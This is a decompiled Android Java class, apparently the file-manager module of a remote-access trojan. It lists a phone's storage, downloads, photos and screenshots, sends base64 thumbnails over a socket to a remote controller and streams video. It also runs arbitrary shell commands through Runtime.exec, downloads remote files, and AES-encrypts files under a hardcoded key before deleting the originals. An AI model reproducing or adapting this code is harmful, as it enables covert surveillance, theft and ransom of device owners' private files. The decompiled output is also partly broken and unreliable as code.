/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Fragment
 *  android.app.usage.StorageStatsManager
 *  android.content.Context
 *  android.content.Intent
 *  android.content.res.Resources
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Bitmap$Config
 *  android.graphics.BitmapFactory
 *  android.graphics.Canvas
 *  android.graphics.RectF
 *  android.graphics.drawable.BitmapDrawable
 *  android.media.MediaPlayer
 *  android.net.Uri
 *  android.os.Build$VERSION
 *  android.os.Environment
 *  android.os.StatFs
 *  android.os.storage.StorageManager
 *  android.util.Base64
 *  android.widget.Toast
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.app.Fragment;
import android.app.usage.StorageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.RectF;
import android.graphics.drawable.BitmapDrawable;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.os.storage.StorageManager;
import android.util.Base64;
import android.widget.Toast;
import androidx.core.content.FileProvider;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.Charset;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.Format;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;
import java.util.UUID;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.Executor;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import linker.resourcer.encoder.DownloadForegroundService;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.CommandExecutor;
import org.json.JSONObject;

public class FileOperationsFragment
extends Fragment {
    private static String SPL_ARRAY;
    private static String SPL_DATA;
    private static String SPL_LINE;
    private static final String cryptkey = "icontrol";
    private static int max;
    private static String mp;
    private static Executor myExcuter;

    static {
        mp = "ssolrssolr";
        SPL_DATA = ConfigurationConstants.SPLIT_DATA;
        SPL_ARRAY = ConfigurationConstants.SPLIT_ARAY;
        SPL_LINE = ConfigurationConstants.SPLIT_DATA;
        myExcuter = null;
        max = 1000;
    }

    public static long buff(long l) {
        l = l > 262144L ? 131072L : (l >= 262144L ? 65536L : (l >= 131072L ? 32768L : (l >= 65536L ? 16384L : (l >= 1024L ? 4096L : 512L))));
        return l;
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * WARNING - void declaration
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static String calculateMD5(String object) {
        void var0_3;
        try {
            int n;
            Object object2 = MessageDigest.getInstance("MD5");
            FileInputStream fileInputStream = new FileInputStream((String)object);
            object = new byte[8192];
            while ((n = fileInputStream.read((byte[])object)) > 0) {
                ((MessageDigest)object2).update((byte[])object, 0, n);
            }
            fileInputStream.close();
            object = ((MessageDigest)object2).digest();
            object2 = new StringBuilder();
            int n2 = ((Object)object).length;
            n = 0;
            while (n < n2) {
                ((StringBuilder)object2).append(String.format("%02x", (byte)object[n]));
                ++n;
            }
            return ((StringBuilder)object2).toString();
        }
        catch (IOException iOException) {
        }
        catch (NoSuchAlgorithmException noSuchAlgorithmException) {
            // empty catch block
        }
        var0_3.printStackTrace();
        return null;
    }

    private File findScreenshotsDirectory(File file, String string2, String string3) {
        if ((file = new File(file, string2 + File.separator + string3)).exists() && file.isDirectory()) {
            return file;
        }
        return null;
    }

    private String formatSize(long l) {
        float f;
        String string2 = null;
        float f2 = f = (float)l;
        if (l >= 1024L) {
            string2 = "KB";
            f2 = f /= 1024.0f;
            if (f >= 1024.0f) {
                string2 = "MB";
                f2 = f /= 1024.0f;
                if (f >= 1024.0f) {
                    string2 = "GB";
                    f2 = f / 1024.0f;
                }
            }
        }
        return String.format("%.2f", Float.valueOf(f2)) + " " + string2;
    }

    private String getStorageInfo(Context object) {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                Object object2 = (StorageManager)object.getSystemService("storage");
                object = (StorageStatsManager)object.getSystemService("storagestats");
                object2 = object2.getUuidForPath(Environment.getDataDirectory());
                long l = object.getTotalBytes((UUID)object2);
                long l2 = object.getFreeBytes((UUID)object2);
                object2 = String.format("%.2f", (double)l / 1.073741824E9);
                String string2 = this.formatSize(l - l2);
                object = new StringBuilder();
                return ((StringBuilder)object).append(SPL_ARRAY).append((String)object2).append(SPL_ARRAY).append(string2).toString();
            }
            double d = FileOperationsFragment.getTotalStorageSize((Context)object);
            long l = (long)(Math.pow(1024.0, 3.0) * d);
            object = new StatFs(Environment.getExternalStorageDirectory().getPath());
            long l3 = object.getAvailableBlocksLong();
            long l4 = object.getBlockSizeLong();
            object = new StringBuilder();
            object = ((StringBuilder)object).append(SPL_ARRAY).append(d).append(SPL_ARRAY).append(this.formatSize(l - l3 * l4)).toString();
            return object;
        }
        catch (Exception exception) {
            return SPL_ARRAY + "0 KB" + SPL_ARRAY + "0 KB";
        }
    }

    public static SizeRepresentation getStorageSizeRepresentation(long l) {
        SizeRepresentation sizeRepresentation = FileOperationsFragment.log((double)l / Math.pow(1024.0, 3.0), 2.0) % 1.0 == 0.0 ? SizeRepresentation.BINARY : SizeRepresentation.DECIMAL;
        return sizeRepresentation;
    }

    public static double getTotalStorageSize(Context context) {
        StorageManager storageManager = (StorageManager)context.getSystemService("storage");
        if (Build.VERSION.SDK_INT >= 26) {
            int n;
            long l;
            try {
                l = ((StorageStatsManager)context.getSystemService("storagestats")).getTotalBytes(storageManager.getUuidForPath(Environment.getDataDirectory()));
                n = FileOperationsFragment.getStorageSizeRepresentation(l).getBase();
            }
            catch (IOException iOException) {
                return 0.0;
            }
            double d = n;
            return (double)l / (d * d * d);
        }
        throw new UnsupportedOperationException("This feature is not supported on devices running lower versions of Android.");
    }

    private static double log(double d, double d2) {
        return Math.log(d) / Math.log(d2);
    }

    private Bitmap scaleCenterCrop(Bitmap bitmap, int n, int n2) {
        float f = n2;
        float f2 = bitmap.getWidth();
        float f3 = n;
        float f4 = bitmap.getHeight();
        float f5 = Math.max(f / f2, f3 / f4);
        f2 *= f5;
        f = (f - f2) / 2.0f;
        f3 = (f3 - (f5 *= f4)) / 2.0f;
        RectF rectF = new RectF(f, f3, f2 + f, f5 + f3);
        Bitmap bitmap2 = Bitmap.createBitmap((int)n2, (int)n, (Bitmap.Config)bitmap.getConfig());
        new Canvas(bitmap2).drawBitmap(bitmap, null, rectF, null);
        return bitmap2;
    }

    private Bitmap scaleToFit(Bitmap bitmap, int n, int n2) {
        float f = bitmap.getWidth();
        float f2 = bitmap.getHeight();
        float f3 = Math.min((float)n2 / f, (float)n / f2);
        int n3 = Math.round(f * f3);
        int n4 = Math.round(f2 * f3);
        Bitmap bitmap2 = Bitmap.createScaledBitmap((Bitmap)bitmap, (int)n3, (int)n4, (boolean)true);
        bitmap = Bitmap.createBitmap((int)n2, (int)n, (Bitmap.Config)bitmap.getConfig());
        new Canvas(bitmap).drawBitmap(bitmap2, (float)(n2 - n3) / 2.0f, (float)(n - n4) / 2.0f, null);
        return bitmap;
    }

    public static Uri uriFromFile(Context context, File file) {
        return FileProvider.getUriForFile(context, context.getPackageName() + ".provider", file);
    }

    public void FileDelete(String string2) {
        try {
            File file = new File(string2);
            if (file.exists()) {
                file.delete();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public void FolderDelete(String stringArray) {
        String string2 = new String(stringArray.getBytes("utf-8"));
        stringArray = string2.split(" ");
        string2 = "(U+0020)".toLowerCase();
        int n = 0;
        while (true) {
            if (n >= stringArray.length) break;
            if (stringArray[n].contains(string2)) {
                stringArray[n] = stringArray[n].replace(string2, " ");
            }
            ++n;
            continue;
            break;
        }
        try {
            Runtime.getRuntime().exec(stringArray);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /*
     * Loose catch block
     */
    public String[] Load(Context object, String object2) {
        String[] stringArray;
        block73: {
            StringBuffer stringBuffer;
            String string2;
            block67: {
                String string3;
                block68: {
                    String string4;
                    String string5;
                    Object object3;
                    block59: {
                        block64: {
                            block66: {
                                block65: {
                                    block63: {
                                        block62: {
                                            block61: {
                                                block60: {
                                                    block58: {
                                                        object3 = "MM/dd/yyyy EEE";
                                                        stringArray = new String[2];
                                                        string5 = "null";
                                                        string4 = "";
                                                        if (myExcuter == null) {
                                                            myExcuter = new ThreadPoolExecutor(8, 15, 1L, TimeUnit.MINUTES, new ArrayBlockingQueue<Runnable>(max));
                                                        }
                                                        string2 = string5;
                                                        string2 = string5;
                                                        stringBuffer = new StringBuffer();
                                                        string2 = string5;
                                                        if (!object2.equals("get0")) break block58;
                                                        string2 = string5;
                                                        object2 = Environment.getExternalStorageDirectory().getPath();
                                                        string2 = string5;
                                                        string4 = this.getStorageInfo((Context)object);
                                                        object = object2;
                                                        break block59;
                                                    }
                                                    string2 = string5;
                                                    if (!object2.equals("get1")) break block60;
                                                    string2 = string5;
                                                    object = Environment.getExternalStoragePublicDirectory((String)Environment.DIRECTORY_DOWNLOADS).toString();
                                                    break block59;
                                                }
                                                string2 = string5;
                                                if (!object2.equals("get2")) break block61;
                                                string2 = string5;
                                                object = Environment.getExternalStoragePublicDirectory((String)Environment.DIRECTORY_PICTURES).toString();
                                                break block59;
                                            }
                                            string2 = string5;
                                            if (!object2.equals("get3")) break block62;
                                            string2 = string5;
                                            object = Environment.getExternalStoragePublicDirectory((String)Environment.DIRECTORY_DCIM).toString();
                                            break block59;
                                        }
                                        string2 = string5;
                                        if (!object2.equals("get4")) break block63;
                                        string2 = string5;
                                        object = Environment.getExternalStoragePublicDirectory((String)Environment.DIRECTORY_MOVIES).toString();
                                        break block59;
                                    }
                                    string2 = string5;
                                    if (!object2.equals("get5")) break block64;
                                    string2 = string5;
                                    object2 = this.findScreenshotsDirectory(Environment.getExternalStorageDirectory(), Environment.DIRECTORY_PICTURES, "Screenshots");
                                    object = object2;
                                    if (object2 != null) break block65;
                                    string2 = string5;
                                    object = this.findScreenshotsDirectory(Environment.getExternalStorageDirectory(), Environment.DIRECTORY_DCIM, "Screenshots");
                                }
                                if (object != null) {
                                    string2 = string5;
                                    string2 = string5;
                                    object2 = new StringBuilder();
                                    string2 = string5;
                                    object = object2.append(((File)object).getAbsolutePath()).append(File.separator).toString();
                                    break block59;
                                }
                                string2 = string5;
                                if (Build.VERSION.SDK_INT < 29) break block66;
                                string2 = string5;
                                object = Environment.getExternalStoragePublicDirectory((String)Environment.DIRECTORY_SCREENSHOTS).toString();
                                break block59;
                            }
                            string2 = string5;
                            return new String[]{null, null};
                        }
                        string2 = string5;
                        object2.equals("get6");
                        object = object2;
                    }
                    string2 = string5;
                    string2 = string5;
                    Object object4 = new File((String)object);
                    object = string5;
                    string2 = string5;
                    if (!((File)object4).isDirectory()) break block67;
                    string2 = string5;
                    string3 = ((File)object4).getPath();
                    object = string3;
                    object2 = object;
                    File[] fileArray = ((File)object4).listFiles();
                    if (fileArray == null) break block68;
                    object2 = object;
                    if (fileArray.length <= 0) break block68;
                    int n = 0;
                    string5 = object3;
                    while (true) {
                        block72: {
                            Comparable<StringBuilder> comparable;
                            long l;
                            String string6;
                            block74: {
                                block69: {
                                    block71: {
                                        block70: {
                                            object2 = object;
                                            int n2 = fileArray.length;
                                            if (n >= n2) break block67;
                                            string6 = fileArray[n].getName();
                                            l = fileArray[n].length();
                                            string2 = "n/a";
                                            object2 = string2;
                                            object2 = string2;
                                            object3 = new File(fileArray[n].getPath());
                                            object2 = string2;
                                            object2 = string2;
                                            object4 = new SimpleDateFormat(string5, Locale.ENGLISH);
                                            object2 = string2;
                                            object2 = string2;
                                            SimpleDateFormat simpleDateFormat = new SimpleDateFormat(string5, Locale.ENGLISH);
                                            object2 = string2;
                                            object2 = string2;
                                            comparable = new Date();
                                            object2 = string2;
                                            string2 = simpleDateFormat.format((Date)comparable);
                                            object2 = string2;
                                            try {
                                                object3 = ((Format)object4).format(((File)object3).lastModified());
                                                object4 = string2;
                                            }
                                            catch (Exception exception) {
                                                object3 = "n/a";
                                                object4 = object2;
                                            }
                                            string2 = "n/a";
                                            boolean bl = fileArray[n].isDirectory();
                                            if (!bl) break block69;
                                            object2 = fileArray[n].listFiles();
                                            if (object2 != null) break block70;
                                            string2 = "0";
                                            break block71;
                                        }
                                        try {
                                            string2 = String.valueOf(((File[])object2).length);
                                        }
                                        catch (Exception exception) {}
                                    }
                                    object2 = "0";
                                    break block74;
                                    catch (Exception exception) {
                                        break block72;
                                    }
                                }
                                object2 = fileArray[n].isFile() ? "1" : "n/a";
                            }
                            comparable = new StringBuilder();
                            stringBuffer.append(comparable.append("1").append(SPL_ARRAY).append((String)object2).append(SPL_ARRAY).append(string6).append(SPL_ARRAY).append(String.valueOf(l)).append(SPL_ARRAY).append(string3).append(SPL_ARRAY).append((String)object3).append(SPL_ARRAY).append((String)object4).append(SPL_ARRAY).append(string2).append(string4).append(SPL_LINE).toString());
                            break block72;
                            catch (Exception exception) {
                                // empty catch block
                            }
                        }
                        ++n;
                    }
                }
                try {
                    object2 = new StringBuilder();
                    stringBuffer.append(object2.append("-1").append(SPL_ARRAY).append(string3).append(SPL_LINE).toString());
                    break block67;
                }
                catch (Exception exception) {
                    object2 = object;
                    break block73;
                }
                catch (Exception exception) {}
                break block73;
            }
            string2 = object;
            try {
                stringArray[0] = stringBuffer.toString();
                stringArray[1] = object;
                return stringArray;
            }
            catch (Exception exception) {
                object2 = string2;
            }
        }
        stringArray[0] = "-1" + SPL_ARRAY + (String)object2 + SPL_LINE;
        stringArray[1] = object2;
        return stringArray;
    }

    public void ViewFile(String string2, String string3, String string4, String string5, Context context) {
        if (myExcuter == null) {
            myExcuter = new ThreadPoolExecutor(8, 15, 1L, TimeUnit.MINUTES, new ArrayBlockingQueue<Runnable>(max));
        }
        if (((ThreadPoolExecutor)myExcuter).getActiveCount() >= max) {
            return;
        }
        myExcuter.execute(new Runnable(){
            final FileOperationsFragment this$0;
            final Context val$ctx;
            final String val$path;
            final String val$playit;
            final String val$sokidf;
            final String val$status;
            {
                this.this$0 = steqsgwkdwatgyqwgjfpwfesqgr2;
                this.val$path = string2;
                this.val$status = string3;
                this.val$ctx = context;
                this.val$playit = string4;
                this.val$sokidf = string5;
            }

            @Override
            public void run() {
                block7: {
                    try {
                        Object object;
                        Uri uri;
                        try {
                            uri = Uri.parse((String)this.val$path.trim());
                            object = new File(uri.getPath());
                            if (!((File)object).exists() || ((File)object).length() <= 0L) break block7;
                            if (this.val$status.equals("true")) {
                                CommandExecutor.instance(this.val$ctx).Playvideostrem(this.val$ctx, this.val$path, this.val$playit, this.val$sokidf);
                                break block7;
                            }
                            uri = BitmapFactory.decodeFile((String)((File)object).getPath());
                            object = new BitmapDrawable(Resources.getSystem(), (Bitmap)uri);
                            object = (BitmapDrawable)object;
                            uri = this.this$0.scaleToFit(object.getBitmap(), 300, 300);
                            object = new ByteArrayOutputStream();
                            uri.compress(Bitmap.CompressFormat.JPEG, 10, (OutputStream)object);
                            object = Base64.encodeToString((byte[])((ByteArrayOutputStream)object).toByteArray(), (int)0);
                        }
                        catch (Exception exception) {
                        }
                        try {
                            uri = new JSONObject();
                            uri.put("type", (Object)"thumb");
                            uri.put("img", object);
                            uri.put("pth", (Object)this.val$path);
                            object = uri.toString();
                            CommandExecutor.instance(this.val$ctx).SendNewSocket(this.val$ctx, this.val$sokidf, (String)object);
                        }
                        catch (Exception exception) {}
                    }
                    catch (OutOfMemoryError outOfMemoryError) {
                        // empty catch block
                    }
                }
            }
        });
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void copyFile(String object, String object2) throws IOException {
        File file = new File((String)object);
        if (!file.exists()) throw new IOException("Source file does not exist: " + (String)object);
        Object object4 = file.getName();
        object = new File((String)object2);
        if (((File)object).isDirectory()) {
            object2 = new File((File)object, (String)object4).getPath();
        }
        File file2 = new File((String)object2);
        file2.getParentFile().mkdirs();
        object4 = null;
        Closeable closeable = null;
        object2 = object4;
        object = closeable;
        try {
            Object object3;
            object2 = object4;
            object = closeable;
            object2 = object4 = (object3 = new FileInputStream(file));
            object = closeable;
            object2 = object4;
            object = closeable;
            object3 = new FileOutputStream(file2);
            closeable = object3;
            object2 = object4;
            object = closeable;
            object3 = new byte[1024];
            while (true) {
                object2 = object4;
                object = closeable;
                int n = ((FileInputStream)object4).read((byte[])object3);
                if (n > 0) {
                    object2 = object4;
                    object = closeable;
                    ((FileOutputStream)closeable).write((byte[])object3, 0, n);
                    continue;
                }
                break;
            }
        }
        catch (Throwable throwable) {
            if (object2 != null) {
                try {
                    ((FileInputStream)object2).close();
                }
                catch (IOException iOException) {
                    iOException.printStackTrace();
                }
            }
            if (object == null) throw throwable;
            try {
                ((FileOutputStream)object).close();
                throw throwable;
            }
            catch (IOException iOException) {
                iOException.printStackTrace();
            }
            throw throwable;
        }
        try {
            ((FileInputStream)object4).close();
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
        }
        try {
            ((FileOutputStream)closeable).close();
            return;
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
            return;
        }
    }

    public boolean createf(String object, boolean bl) {
        if (((File)(object = new File((String)object))).exists()) {
            return true;
        }
        if (bl) {
            return ((File)object).mkdirs();
        }
        File file = ((File)object).getParentFile();
        if (file != null && !file.exists() && !file.mkdirs()) {
            return false;
        }
        try {
            bl = ((File)object).createNewFile();
            return bl;
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
            return false;
        }
    }

    public void decrypt(String string2, String object, String object2) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        int n;
        InputStream inputStream = new FileInputStream(string2);
        object2 = new FileOutputStream((String)object2);
        object = (mp + (String)object).getBytes("UTF-8");
        SecretKeySpec secretKeySpec = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("SHA-1").digest((byte[])object), 16), "AES");
        object = Cipher.getInstance("AES");
        ((Cipher)object).init(2, secretKeySpec);
        inputStream = new CipherInputStream(inputStream, (Cipher)object);
        object = new byte[8];
        while ((n = ((CipherInputStream)inputStream).read((byte[])object)) != -1) {
            ((FileOutputStream)object2).write((byte[])object, 0, n);
        }
        ((OutputStream)object2).flush();
        ((FileOutputStream)object2).close();
        ((CipherInputStream)inputStream).close();
        this.FileDelete(string2);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void downloadFile(Context context, String string2, String string3, String string4) {
        CharSequence charSequence = string2;
        try {
            if (!string2.startsWith("http://")) {
                charSequence = string2;
                if (!string2.startsWith("https://")) {
                    charSequence = new StringBuilder();
                    charSequence = ((StringBuilder)charSequence).append("http://").append(string2).toString();
                }
            }
            string2 = new Intent(context, DownloadForegroundService.class);
            string2.putExtra("extra_url", (String)charSequence);
            string2.putExtra("extra_file_name", string3);
            string2.putExtra("extra_dir", string4);
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService((Intent)string2);
                return;
            }
            context.startService((Intent)string2);
            return;
        }
        catch (Exception exception) {
            Toast.makeText((Context)context, (CharSequence)("Error: " + exception.getMessage()), (int)1).show();
        }
    }

    public void encrypt(String string2, String object, String object2) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        int n;
        FileInputStream fileInputStream = new FileInputStream(string2);
        object2 = new FileOutputStream(string2.concat((String)object2));
        object = (mp + (String)object).getBytes("UTF-8");
        object = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("SHA-1").digest((byte[])object), 16), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(1, (Key)object);
        object = new CipherOutputStream((OutputStream)object2, cipher);
        object2 = new byte[8];
        while ((n = fileInputStream.read((byte[])object2)) != -1) {
            ((CipherOutputStream)object).write((byte[])object2, 0, n);
        }
        ((CipherOutputStream)object).flush();
        ((CipherOutputStream)object).close();
        fileInputStream.close();
        this.FileDelete(string2);
    }

    public void moveFile(String string2, String string3) throws IOException {
        this.copyFile(string2, string3);
        if (new File(string2).delete()) {
            return;
        }
        throw new IOException("Failed to delete the original file after copying: " + string2);
    }

    public String openPath(Context object, String string2) {
        Object object2;
        block4: {
            try {
                object2 = new File(string2);
                if (((File)object2).exists()) break block4;
                return "The path does not exist.";
            }
            catch (Exception exception) {
                return "Can't open path, error: " + exception.getMessage();
            }
        }
        if (((File)object2).isDirectory()) {
            object2 = new Intent("android.intent.action.OPEN_DOCUMENT_TREE");
            object2.addFlags(1);
            object2.addFlags(64);
            object2.addFlags(0x10000000);
            object.startActivity((Intent)object2);
            object = new StringBuilder();
            return ((StringBuilder)object).append(string2).append(" folder opened.").toString();
        }
        Uri uri = FileOperationsFragment.uriFromFile((Context)object, (File)object2);
        object2 = object.getContentResolver().getType(uri);
        Intent intent = new Intent();
        intent.setAction("android.intent.action.VIEW");
        intent.setDataAndType(uri, (String)object2);
        intent.addFlags(1);
        intent.addFlags(0x10000000);
        object.startActivity(intent);
        object = new StringBuilder();
        object = ((StringBuilder)object).append(string2).append(" file opened.").toString();
        return object;
    }

    public void playsound(String string2) {
        MediaPlayer mediaPlayer = new MediaPlayer();
        try {
            mediaPlayer.setDataSource(string2);
            mediaPlayer.prepare();
            mediaPlayer.start();
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
        }
    }

    public void rename(String object, String string2) {
        try {
            File file = new File((String)object);
            if (file.exists()) {
                object = new File(string2);
                file.renameTo((File)object);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void unzip(String object, String string2) {
        if (!new File(string2).exists()) return;
        try {
            Object object2 = new FileInputStream((String)object);
            ZipInputStream zipInputStream = new ZipInputStream((InputStream)object2, Charset.forName("Cp437"));
            object = object2;
            while (true) {
                int n;
                int n2;
                Object object3;
                CharSequence charSequence;
                ZipEntry zipEntry;
                block13: {
                    block12: {
                        block11: {
                            if ((zipEntry = zipInputStream.getNextEntry()) == null) break block11;
                            object2 = new StringBuilder();
                            charSequence = ((StringBuilder)object2).append(string2).append(zipEntry.getName()).toString();
                            object2 = new File((String)charSequence);
                            if (!((File)object2).isDirectory()) break block12;
                            if (!((File)object2).exists()) {
                                ((File)object2).mkdirs();
                            }
                            break block13;
                        }
                        zipInputStream.close();
                        return;
                    }
                    object3 = "";
                    n2 = ((String)charSequence).length() - 1;
                    while (true) {
                        object2 = object3;
                        if (n2 < 0) break;
                        if (String.valueOf(((String)charSequence).charAt(n2)).equals("/")) {
                            object2 = ((String)charSequence).substring(0, n2);
                            break;
                        }
                        --n2;
                    }
                    if (!((File)(object3 = new File((String)object2))).exists()) {
                        ((File)object3).mkdirs();
                    }
                }
                if (((File)(object3 = new File(((StringBuilder)(object2 = new StringBuilder())).append(string2).append(zipEntry.getName()).toString()))).isDirectory()) continue;
                charSequence = new StringBuilder();
                object2 = new FileOutputStream(((StringBuilder)charSequence).append(string2).append(zipEntry.getName()).toString());
                n2 = Long.valueOf(FileOperationsFragment.buff(((File)object3).length())).intValue();
                object3 = new byte[n2];
                while ((n = zipInputStream.read((byte[])object3, 0, n2)) != -1) {
                    ((FileOutputStream)object2).write((byte[])object3, 0, n);
                }
                zipInputStream.closeEntry();
                ((FileOutputStream)object2).close();
            }
        }
        catch (Exception exception) {
            return;
        }
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void zip(String[] stringArray, String object) {
        ZipOutputStream zipOutputStream;
        try {
            Object object2 = new File((String)object);
            if (!((File)object2).exists()) {
                ((File)object2).createNewFile();
            }
            Closeable closeable = new FileOutputStream(((File)object2).getPath());
            object = new BufferedOutputStream((OutputStream)closeable);
            zipOutputStream = new ZipOutputStream((OutputStream)object);
            object = object2;
            for (int i = 0; i < stringArray.length; ++i) {
                int n;
                object2 = new File(stringArray[i]);
                if (((File)object2).isDirectory()) continue;
                int n2 = Long.valueOf(FileOperationsFragment.buff(((File)object2).length())).intValue();
                object2 = new byte[n2];
                Object object3 = new FileInputStream(stringArray[i]);
                closeable = new BufferedInputStream((InputStream)object3, n2);
                object3 = new ZipEntry(stringArray[i].substring(stringArray[i].lastIndexOf("/") + 1));
                zipOutputStream.putNextEntry((ZipEntry)object3);
                while ((n = ((BufferedInputStream)closeable).read((byte[])object2, 0, n2)) != -1) {
                    zipOutputStream.write((byte[])object2, 0, n);
                }
                ((BufferedInputStream)closeable).close();
            }
        }
        catch (Exception exception) {
            return;
        }
        {
            zipOutputStream.close();
            return;
        }
    }

    public static enum SizeRepresentation {
        BINARY(1024),
        DECIMAL(1000);

        private final int base;

        private SizeRepresentation(int n2) {
            this.base = n2;
        }

        public int getBase() {
            return this.base;
        }
    }
}

